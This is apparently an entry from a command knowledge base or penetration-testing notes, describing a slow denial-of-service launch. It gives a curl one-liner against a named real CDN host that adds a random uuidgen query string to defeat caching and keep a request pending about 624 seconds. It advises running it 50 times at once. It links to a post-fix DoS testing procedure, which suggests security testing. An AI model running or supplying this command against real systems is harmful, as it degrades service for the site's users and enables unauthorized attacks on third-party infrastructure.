---
id: cmd-curl-slow2-dos-001
data: >-
  curl
  https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/█████████?$(uuidgen)
  > /dev/null &
tags:
  - slow-dos
  - cache-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.918Z'
verified: false
validated: true
submitted: true
---
# curl-slow2-dos-launch

## Command

```bash
curl https://camo.stream.highwebmedia.com/ec276c9fdbd7f4ae273a2b7f02d0bef651aebadd/█████████?$(uuidgen) > /dev/null &
```

## Description

Background curl to slow2.php with random uuidgen query to disable CDN caching, for post-fix slow DoS (~624s pending).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `?$(uuidgen)` | Append unique string | Yes |
| `> /dev/null` | Discard | Yes |
| `&` | Background | Yes |

## Examples

### Basic Usage

Run 50 times for concurrency.

## Expected Output

Long pending ~624s.

## Related

- [[commands/curl-slow-dos-launch]]
- [[procedures/Post-Fix-DoS-Testing]]
